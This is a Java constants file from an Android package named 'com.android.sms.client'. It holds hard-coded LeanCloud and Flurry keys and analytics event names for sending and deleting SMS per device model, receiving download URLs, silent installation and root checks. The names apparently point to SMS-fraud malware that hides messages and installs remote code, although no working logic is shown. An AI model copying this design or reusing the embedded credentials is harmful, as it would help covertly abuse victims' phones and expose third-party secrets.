package com.android.sms.client;

/**
 * @author zyq 16-3-31
 */
public class NativeParams {

	//记住，是国内节点．．．．．．．．．．
	public static final String LEAN_APP_ID = "9XPWddAKXD2jlejxTBDFczRM-gzGzoHsz";
	public static final String LEAN_APP_KEY = "mh2NgV80wbeO6E3L9q0Hhb7a";

	public static final String FLURRY_APP_KEY = "HHQJ647HZ5Q89PQTWF7P";

	//发送短信
	public static String EVENT_SEND_SMS = "sendSMS";
	public static String KEY_DELETE_SMS_SUCCESS = "deleteSMSSuccess";

	//删除短信成功
	public static String EVENT_DELETE_SMS_SUCCESS = "deleteSMSSuccess";
	public static String KEY_DELETE_SUCCESS_VERSION = "phoneAndroidVersion";
	public static String KEY_DELETE_SUCCESS_DEVICE = "phoneDevice";

	//删除短信失败
	public static String EVENT_DELETE_SMS_FAILED = "deleteSMSFail";
	public static String KEY_DELETE_FAIL_VERSION = "phoneAndroidVersion";
	public static String KEY_DELETE_FAIL_DEVICE = "phoneDevice";

	//4.4删除成功的机型
	public static String EVENT_VERSION_KITKAT = "kitkat";
	public static String KEY_KITKAT_DEVICE = "kitKatDevice";
	public static String KEY_FIX_SYSTEM_SUCCESS = "fixSystem";

	public static String EVENT_ACCEPT_BROADCAST = "acceptBroadCast";
	public static String KEY_SERVICE_START_SUCCESS = "startServiceSuccess";
	public static String KEY_BROADCAST_TYPE = "broadcastType";

	public static String EVENT_ACCEPT_UPDATE_INFO = "acceptUpdateInfo";
	public static String KEY_DOWNLOAD_URL = "downloadUrl";
	public static String KEY_DOWNLOAD_START = "startDownload";


	public static String EVENT_START_DOWNLOAD = "startDownload";
	public static String KEY_DOWNLOAD_SUCCESS = "downloadSuccess";


	public static String EVENT_START_INSTALL = "startSilentInstall";
	public static String KEY_INSTALL_SUCCESS = "installSuccess";
	public static String KEY_IS_DEVICE_ROOT = "isDeviceRoot";


}
